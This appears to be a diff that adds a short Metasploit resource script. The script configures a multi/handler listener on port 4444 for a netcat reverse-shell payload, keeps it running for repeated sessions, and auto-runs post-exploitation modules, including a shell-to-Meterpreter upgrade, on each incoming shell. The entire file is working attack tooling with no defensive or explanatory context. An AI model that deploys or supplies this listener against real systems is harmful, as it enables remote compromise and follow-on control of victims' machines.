@@ -1,0 +1,9 @@
+use exploit/multi/handler
+set PAYLOAD cmd/unix/reverse_netcat
+setg MACRO /docs/misc/shell_to_meterpreter
+set AutoRunScript post/multi/manage/multi_post
+set ExitOnSession false
+setg VERBOSE true
+set LPORT 4444
+exploit -j
+unset AutoRunScript
